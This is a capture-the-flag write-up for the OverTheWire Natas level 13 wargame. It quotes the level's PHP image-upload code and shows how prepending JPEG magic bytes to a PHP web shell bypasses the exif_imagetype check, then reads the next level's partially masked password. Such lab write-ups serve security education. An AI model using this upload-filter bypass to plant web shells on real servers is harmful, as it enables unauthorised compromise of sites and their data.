# level 13

**Host**: http://natas13.natas.labs.overthewire.org
>natas13:trbs5pCjCrkuSknBBKHhaB**********

When you visit the site, you get the following message:

```
For security reasons, we now only accept image files!

Choose a JPEG to upload (max 1KB):
```

### Solution:

When you click on the "View source" link you get following php code:

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

This time the `exif_imagetype()` function is used to identify the file type which reads the first bytes of an image and checks its signature, so we can just inject some `.jpg` "magicbytes" to our `shell.php`.

You can grab the magicbytes from a legit `.jpg` file and add your `shell.php`so the upload filter is bypassed.

```shell
head -c 20 legit.jpg > shell2.php && cat shell.php >> shell2.php
```

Now just repead the same upload process with intercepting from the privious level, but this time with the new `shell2.php` and grab the password for natas14 from the response.

```http
HTTP/1.1 200 OK
Date: Thu, 04 Sep 2025 11:15:11 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 85
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

z3UYcr4v4uBpeX8f7EZbMH**********
```